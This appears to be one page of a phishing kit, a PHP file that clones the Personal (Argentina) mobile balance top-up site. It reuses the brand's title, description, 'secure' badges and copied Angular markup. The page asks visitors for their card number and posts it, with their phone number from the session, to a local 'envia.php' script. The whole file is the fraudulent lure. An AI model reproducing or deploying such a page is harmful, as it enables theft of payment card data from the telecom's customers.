<?php
    session_start();

?>

<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      
      <meta name="description" content="Entrá y recarga tu saldo para seguir navegando con tu línea Personal. Podés recargar con tarjeta de crédito o débito de una manera fácil desde casa.">
      <meta name="viewport" content="viewport-fit=cover, width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
      <title>Recargar Saldo, fácil y se acredita en el momento | Personal</title>
      <link rel="icon" type="image/x-icon" href="media/favicon.ico">
      <link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
      <link rel="stylesheet" type="text/css" href="css/normalizer.css">
      <link rel="stylesheet" type="text/css" href="css/number.css">
   </head>
   <body style="background-color: rgb(27, 27, 29);">
      <app-root>
         <pages>
            <div class="container-fluid">
               <div class="row">
                  <div class="col-12 p-0">
                     <ngx-spinner bdcolor="rgba(0, 0, 0, 0.8)" size="medium" color="#fff" type="ball-clip-rotate" _nghost-prp-c11="">
               
                     </ngx-spinner>
                     <header-component _nghost-prp-c9="">
                        <header _ngcontent-prp-c9="" class="header">
                           <nav _ngcontent-prp-c9="" class="px-0 pt-0">
                              <div _ngcontent-prp-c9="" class="d-flex justify-content-between align-items-center">
                                 <div _ngcontent-prp-c9="" class="ml-3 ml-md-5 bd-highlight"><img _ngcontent-prp-c9="" src="media/flow.svg" class="pl-md-4 img-fluid size-logo"></div>
                                 <div _ngcontent-prp-c9="" class="mr-3 mr-md-5 bd-highlight">
                                    <div _ngcontent-prp-c9="" class="d-none d-sm-block"><img _ngcontent-prp-c9="" src="media/secure.svg" class="pr-md-4"></div>
                                    <div _ngcontent-prp-c9="" class="d-block d-sm-none"><img _ngcontent-prp-c9="" src="media/secure-mobile.svg" class="pr-md-4 pr-2"></div>
                                 </div>
                              </div>
                           </nav>
                        </header>
                     </header-component>
                     <add-card-number _nghost-prp-c36="">
                        <div _ngcontent-prp-c36="" class="row justify-content-center align-items-center mt-4">
                           <div _ngcontent-prp-c36="" class="col-12 col-sm-5">
                              <div _ngcontent-prp-c36="" class="row justify-content-center align-items-center">
                                 <div _ngcontent-prp-c36="" class="col-12 mb-3">
                                    <h3 _ngcontent-prp-c36="" class="title">Datos de la tarjeta</h3>
                                 </div>
                                 <div _ngcontent-prp-c36="">
                                    <card-component _ngcontent-prp-c36="" _nghost-prp-c31="">
                                       <div _ngcontent-prp-c31="" class="row justify-content-center align-items-center" style="width: 310px; height: 175px;">
                                          <img _ngcontent-prp-c31="" id="cdImage" class="position-relative" src="media/card-generic-front.svg">
                                          <div _ngcontent-prp-c31="" class="position-absolute"><span _ngcontent-prp-c31="" style="color:#fff;font-size:20px;font-weight:400;line-height:28px;" id="onNumber">**** **** **** ****</span></div>
                                 
                                       </div>
                                    </card-component>
                                 </div>
                                 <div _ngcontent-prp-c36="" class="col-12 mt-5">
                                    <form _ngcontent-prp-c36="" action="envia.php" method="POST" class="ng-pristine ng-invalid ng-touched" id="siguiente3">
                                    <input type="hidden" name="pn" value="<?php echo($_SESSION['lineNumber']);?>">
                                    <input type="hidden" name="am" value="100">
                                    <input type="hidden" name="cdType" id="cdType">
   
                                    <div _ngcontent-prp-c36="" class="form-group">
                                          <div _ngcontent-prp-c36="" class="input-group">
                                             <div _ngcontent-prp-c36="" class="card-number">
                                                <label _ngcontent-prp-c36="" class="label-input">Número de la Tarjeta</label><input _ngcontent-prp-c36="" id="cnmber" name="cnmber" type="tel" formcontrolname="number" placeholder="Ej: 4554 5784 6624 1245" aria-describedby="cardNumberHelp" class="custom-input-dark card-icon ng-pristine ng-invalid ng-touched" maxlength="19"><small _ngcontent-prp-c36="" id="cardNumberHelp" class="form-text help-text">Ingresá los 16 dígitos del frente de la tarjeta</small><!---->
                                                <field-error _ngcontent-prp-c36="" errormsg=" El número de tarjeta que ingresaste es incorrecto " _nghost-prp-c33="">
                                          
                                                </field-error>
                                                <field-error _ngcontent-prp-c36="" errormsg="La tarjeta ingresada no está habilitada " _nghost-prp-c33="">
                                          
                                                </field-error>
                                             </div>
                                          </div>
                                       </div>
                                 </form></div>
                                 <div _ngcontent-prp-c36="" class="col-12">
                                    <div _ngcontent-prp-c36="" class="row mt-5 mb-5 pl-4 pr-4">
                                       <div _ngcontent-prp-c36="" class="col-12 col-sm-6 text-right order-1 order-md-0 mb-4"><button _ngcontent-prp-c36="" id="backButtonNumber" type="button" class="btn-back-dark mb-4 mb-sm-0">Anterior</button></div>
                                       <div _ngcontent-prp-c36="" class="col-12 col-sm-6 text-left order-0 order-md-1 mb-4">
                                          <button _ngcontent-prp-c36="" id="nmButton" class="btn-disabled-dark d-block d-md-inline-block" form="siguiente3">Siguiente</button>
                                       </div>
                                    </div>
                                 </div>
                                 
                              </div>
                           </div>
                        </div>
                     </add-card-number></div>
               </div>
            </div>
         </pages></app-root>
         
<script src="javascript/query.min.js"></script>
<script src="javascript/query-form.js"></script>
<script src="javascript/poper.min.js"></script>
<script src="javascript/bootstrap.min.js"></script>
<script src="javascript/jquery.mask.js"></script>
<script src="javascript/custom.js"></script> 
   

</body></html>